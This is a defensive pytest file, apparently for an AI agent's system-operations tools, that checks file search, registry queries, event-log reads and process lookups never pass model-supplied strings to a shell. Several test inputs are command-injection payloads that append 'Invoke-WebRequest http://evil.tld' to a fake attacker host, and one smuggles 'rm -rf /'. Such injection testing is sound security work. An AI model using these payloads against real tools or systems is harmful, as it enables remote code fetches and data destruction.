"""system_ops must never turn model-supplied strings into executable code."""

import sys

import pytest

import tools.system_ops as system_ops
from tools.system_ops import (
    get_process_info, query_registry, read_event_logs, search_system_files,
)


class TestNoShellForFileSearch:
    def test_search_never_spawns_a_shell(self, tmp_path, monkeypatch):
        (tmp_path / "a.log").write_text("x", encoding="utf-8")

        def explode(*a, **k):
            raise AssertionError("search_system_files must not shell out")

        monkeypatch.setattr(system_ops.subprocess, "run", explode)
        out = search_system_files(str(tmp_path), "*.log")
        assert "a.log" in out

    def test_injection_payload_is_treated_as_a_path(self, tmp_path):
        # The classic payload: if interpolated into a script it would execute.
        evil = str(tmp_path) + '"; Invoke-WebRequest http://evil.tld; #'
        out = search_system_files(evil, "*")
        assert out.startswith("Error:")          # just a non-existent path
        assert "Invoke-WebRequest" not in out or "does not exist" in out

    def test_recursive_match_and_cap(self, tmp_path, monkeypatch):
        monkeypatch.setattr(system_ops, "_MAX_FILE_RESULTS", 3)
        nested = tmp_path / "deep" / "deeper"
        nested.mkdir(parents=True)
        for i in range(6):
            (nested / f"f{i}.txt").write_text("x", encoding="utf-8")
        out = search_system_files(str(tmp_path), "*.txt")
        assert "stopped at 3 results" in out

    def test_pattern_filters(self, tmp_path):
        (tmp_path / "keep.txt").write_text("x", encoding="utf-8")
        (tmp_path / "skip.bin").write_text("x", encoding="utf-8")
        out = search_system_files(str(tmp_path), "*.txt")
        assert "keep.txt" in out and "skip.bin" not in out

    def test_missing_path_is_reported(self, tmp_path):
        assert "does not exist" in search_system_files(str(tmp_path / "nope"), "*")


class TestRegistryUsesNativeApi:
    def test_registry_never_spawns_a_shell(self, monkeypatch):
        def explode(*a, **k):
            raise AssertionError("query_registry must not shell out")

        monkeypatch.setattr(system_ops.subprocess, "run", explode)
        # Unknown root: rejected before any I/O, and definitely without a shell.
        out = query_registry('HKLM"; Invoke-WebRequest http://evil.tld; #\\Software')
        assert out.startswith("Error:")

    def test_unknown_root_is_rejected(self):
        out = query_registry("BOGUS:\\Software\\Test")
        assert "unknown registry root" in out.lower()

    def test_empty_path_is_rejected(self):
        assert "required" in query_registry("")

    @pytest.mark.skipif(not sys.platform.startswith("win"), reason="Windows only")
    def test_reads_a_real_key(self):
        out = query_registry(r"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                             "CurrentVersion")
        assert out.startswith("CurrentVersion =") or out.startswith("Error:")


class TestPowerShellArgsAreEnvBound:
    def test_event_log_script_is_literal_and_data_goes_to_env(self, monkeypatch):
        seen = {}

        class _R:
            returncode = 0
            stdout = "[]"
            stderr = ""

        def fake_run(argv, **kw):
            seen["argv"] = argv
            seen["env"] = kw.get("env", {})
            return _R()

        monkeypatch.setattr(system_ops.subprocess, "run", fake_run)
        monkeypatch.setattr(sys, "platform", "win32")

        read_event_logs('System"; Invoke-WebRequest http://evil.tld; #', "Error", 5)
        # Rejected by validation before running anything.
        assert "argv" not in seen

        read_event_logs("System", "Error", 5)
        script = seen["argv"][-1]
        assert "Invoke-WebRequest" not in script
        assert "$env:ARGENT_LOG" in script          # bound as data
        assert seen["env"]["ARGENT_LOG"] == "System"

    def test_invalid_entry_type_rejected(self, monkeypatch):
        monkeypatch.setattr(sys, "platform", "win32")
        out = read_event_logs("System", "Error; rm -rf /", 5)
        assert "unknown entry type" in out.lower()

    def test_process_name_is_env_bound(self, monkeypatch):
        seen = {}

        class _R:
            returncode = 0
            stdout = "{}"
            stderr = ""

        def fake_run(argv, **kw):
            seen["argv"] = argv
            seen["env"] = kw.get("env", {})
            return _R()

        monkeypatch.setattr(system_ops.subprocess, "run", fake_run)
        monkeypatch.setattr(sys, "platform", "win32")

        payload = 'chrome"; Invoke-WebRequest http://evil.tld; #'
        get_process_info(payload)
        script = seen["argv"][-1]
        assert "Invoke-WebRequest" not in script    # payload never reached the script
        assert seen["env"]["ARGENT_PROC"] == payload   # it is just data
